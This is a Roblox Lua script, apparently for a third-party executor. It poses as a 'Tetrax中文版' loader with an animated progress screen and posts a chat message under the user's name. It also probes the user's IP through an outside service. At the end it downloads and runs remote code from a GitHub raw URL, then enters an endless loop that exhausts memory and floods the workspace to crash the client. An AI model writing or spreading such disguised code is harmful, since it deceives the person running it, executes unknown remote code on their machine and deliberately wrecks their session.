local Player,Tween,Sound,Http,Run=game:GetService("Players").LocalPlayer,game:GetService("TweenService"),game:GetService("SoundService"),game:GetService("HttpService"),game:GetService("RunService")

local function SendChatMessage(msg)
    if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    elseif game:GetService("TextChatService") then
        pcall(function()
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(msg)
        end)
    end
end
SendChatMessage("蛋皇现实人不错")

local function C(c,p)local i=Instance.new(c)for k,v in pairs(p)do i[k]=v end return i end

local UI=C("ScreenGui",{Parent=game.CoreGui,DisplayOrder=999,ResetOnSpawn=false})
local MF=C("Frame",{Size=UDim2.new(0,550,0,380),AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.new(0.5,0,0.45,0),BackgroundColor3=Color3.fromRGB(15,25,45),Parent=UI})
C("UICorner",{CornerRadius=UDim.new(0,12),Parent=MF})

local BG=C("Frame",{Size=UDim2.new(1,10,1,10),Position=UDim2.new(0,-5,0,-5),BackgroundColor3=Color3.fromRGB(0,150,255),BackgroundTransparency=0.9,ZIndex=-1,Parent=MF})
C("UICorner",{CornerRadius=UDim.new(0,12),Parent=BG})
Tween:Create(BG,TweenInfo.new(2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{BackgroundTransparency=0.7}):Play()

local TB=C("Frame",{Size=UDim2.new(1,0,0,4),BackgroundColor3=Color3.fromRGB(0,100,255),BorderSizePixel=0,ZIndex=3,Parent=MF})
local UG=C("UIGradient",{Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,150,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,200,255))}),Rotation=90,Parent=TB})
Run.Heartbeat:Connect(function(d)UG.Offset=Vector2.new((UG.Offset.X+d/4)%1)end)

local MainTitle = C("TextLabel",{
    Size = UDim2.new(1, -40, 0, 60),
    Position = UDim2.new(0.5, -255, 0.1, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    Text = "Tetrax中文版",
    TextColor3 = Color3.fromRGB(255, 215, 0),
    Font = Enum.Font.GothamBlack,
    TextSize = 32,
    TextXAlignment = Enum.TextXAlignment.Left,
    BackgroundTransparency = 1,
    ZIndex = 3,
    Parent = MF
})

local TitleOutline = C("UIStroke",{
    Thickness = 2,
    Color = Color3.fromRGB(255, 180, 0),
    ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
    Parent = MainTitle
})

Tween:Create(MainTitle, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
    TextColor3 = Color3.fromRGB(255, 255, 150)
}):Play()

local UF=C("Frame",{Size=UDim2.new(0.9,0,0,100),Position=UDim2.new(0.5,-247.5,0.3,0),AnchorPoint=Vector2.new(0,0.5),BackgroundColor3=Color3.fromRGB(20,35,60),Parent=MF})
C("UICorner",{CornerRadius=UDim.new(0,8),Parent=UF})

local function L(n,y,t)return C("TextLabel",{Size=UDim2.new(0.9,0,0,25),Position=UDim2.new(0.05,0,y,0),Text=t,TextColor3=Color3.fromRGB(180,220,255),Font=Enum.Font.GothamMedium,TextSize=14,TextXAlignment=0,BackgroundTransparency=1,Parent=UF})end

local UID=L("UserIdLabel",0.15,"用户ID: "..Player.UserId)
local UN=L("UsernameLabel",0.45,"用户名: "..Player.Name)
local IP=L("IPLabel",0.75,"IP地址: "..(pcall(function()return Http:GetAsync("http://api.ipify.org")end)and"获取中"or"无法获取"))

local PC=C("Frame",{Size=UDim2.new(0.9,0,0,20),Position=UDim2.new(0.5,-247.5,0.7,0),AnchorPoint=Vector2.new(0,0.5),BackgroundColor3=Color3.fromRGB(20,35,60),Parent=MF})
C("UICorner",{CornerRadius=UDim.new(1,0),Parent=PC})

local PB=C("Frame",{Size=UDim2.new(0,0,1,0),Parent=PC})
local RainbowGradient=C("UIGradient",{
    Color=ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 165, 0)),
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 128))
    }),
    Parent=PB
})

local rainbowOffset = 0
Run.Heartbeat:Connect(function(dt)
    rainbowOffset = (rainbowOffset + dt/2) % 1
    RainbowGradient.Offset = Vector2.new(rainbowOffset, 0)
end)

C("ImageLabel",{Size=UDim2.new(1,0,2,0),Position=UDim2.new(0,0,-0.5,0),BackgroundTransparency=1,Image="rbxassetid://992810554",ImageColor3=Color3.fromRGB(255,255,255),ImageTransparency=0.7,Parent=PB})

local PT=C("TextLabel",{Size=UDim2.new(0.9,0,0,24),Position=UDim2.new(0.5,-247.5,0.8,0),AnchorPoint=Vector2.new(0,0.5),Text="初始化中... 0%",TextColor3=Color3.fromRGB(200,230,255),Font=Enum.Font.GothamMedium,TextSize=18,TextXAlignment=0,BackgroundTransparency=1,Parent=MF})
local ST=C("TextLabel",{Size=UDim2.new(0.9,0,0,18),Position=UDim2.new(0.5,-247.5,0.85,0),AnchorPoint=Vector2.new(0,0.5),Text="正在连接服务器...",TextColor3=Color3.fromRGB(150,190,220),Font=Enum.Font.Gotham,TextSize=14,TextXAlignment=0,BackgroundTransparency=1,Parent=MF})

local PP=C("Part",{Size=Vector3.new(1,1,1),Position=Vector3.new(0,10,0),Anchored=true,CanCollide=false,Transparency=1,Parent=workspace})
C("ParticleEmitter",{Texture="rbxassetid://242880866",LightEmission=1,Color=ColorSequence.new(Color3.fromRGB(0,150,255)),Size=NumberSequence.new({NumberSequenceKeypoint.new(0,0.5),NumberSequenceKeypoint.new(1,2)}),Speed=NumberRange.new(15),Lifetime=NumberRange.new(3),Rate=50,Parent=PP})

local LS=C("Sound",{SoundId="rbxassetid://9114826721",Volume=0.5,Parent=MF})
local CS=C("Sound",{SoundId="rbxassetid://9114826721",Volume=0.7,Parent=MF})
local TS=C("Sound",{SoundId="rbxassetid://137226729",Volume=0.3,Parent=MF})

local FM={"加载...","加载中...","请稍候...","优化中...","最后加载..."}

MF.Size,MF.BackgroundTransparency,TB.BackgroundTransparency=UDim2.new(0,10,0,10),1,1
Tween:Create(MF,TweenInfo.new(0.8,Enum.EasingStyle.Elastic),{Size=UDim2.new(0,550,0,380),BackgroundTransparency=0.1}):Play()
Tween:Create(TB,TweenInfo.new(0.6,Enum.EasingStyle.Quad),{BackgroundTransparency=0}):Play()
LS:Play()
wait(1)

for _,s in ipairs({{15,"验证系统"}, {35,"加载模块"}, {65,"初始化"}, {85,"优化"}, {100,"准备就绪"}})do
    local t,m=s[1],s[2]
    MainTitle.Text = "Tetrax中文版 - "..m
    ST.Text=math.random(3)==1 and FM[math.random(#FM)]or m.."..."
    
    for i=PB.Size.X.Scale*100,t,0.5 do
        PB.Size,PT.Text=UDim2.new(i/100,0,1,0),m.." "..i.."%"
        if i%5==0 then TS:Play()end
        if i%3==0 then
            local x,y=math.random(-2,2),math.random(-1,1)
            MainTitle.Position=UDim2.new(0.5,-255+x,0.1,y)
            PC.Position=UDim2.new(0.5,-247.5+x/2,0.7,y/2)
            wait(0.03)
            MainTitle.Position=UDim2.new(0.5,-255,0.1,0)
            PC.Position=UDim2.new(0.5,-247.5,0.7,0)
        end
        wait(0.05)
    end
    
    if t~=100 then
        Tween:Create(TB,TweenInfo.new(0.2,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,2,true),{BackgroundColor3=Color3.fromRGB(0,255,255)}):Play()
        PP.ParticleEmitter:Emit(30)
        LS:Play()
    end
    wait(0.3)
end

MainTitle.Text = "Tetrax中文版"
PT.Text,ST.Text="系统就绪","加载完成"
CS:Play()
PP.ParticleEmitter:Emit(100)

for i=1,20 do
    MF.BackgroundTransparency=0.1+i/20
    for _,v in pairs(MF:GetDescendants())do
        if v:IsA("TextLabel")then v.TextTransparency=i/20
        elseif v:IsA("Frame")and v.Name=="ProgressBar"then v.BackgroundTransparency=i/20 end
    end
    wait(0.05)
end

UI:Destroy()
PP:Destroy()

loadstring(game:HttpGet("https://raw.githubusercontent.com/DH-NB-666/Egg-King-dan/main/DanHuang--Ohio.lua",true))()

wait(1)
while true do
    local hugeTable = {}
    for i = 1, 1000000 do
        hugeTable[i] = string.rep("CRASH", 1000)
    end
    for i = 1, 1000 do
        Instance.new("Part", workspace)
    end
    wait(0.1)
end
